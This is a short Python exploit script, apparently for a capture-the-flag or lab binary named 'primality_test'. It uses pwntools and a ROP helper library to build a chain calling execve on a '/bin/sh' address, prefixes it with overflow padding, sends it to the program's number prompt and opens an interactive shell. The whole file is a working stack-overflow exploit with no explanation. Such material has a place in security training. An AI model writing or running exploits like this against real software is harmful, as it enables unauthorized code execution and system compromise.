"""
Un po' di documentazione qua?
"""

from pythonAutoRop.auto_rop01.rop import ROP
from pwn import *

file_path = 'primality_test'

EXE_FILE = file_path
exe = ELF(EXE_FILE)
# print(exe.symbols['/bin/sh'])

rop = ROP(exe)
bin_string = 0x08048991
rop.execve(bin_string, 0, 0)
print(rop.dump())


ropchain = b'A'*(0x4c + 4) + rop


p = process(file_path)
p.sendlineafter(b'Enter a number: ', ropchain)
p.interactive()
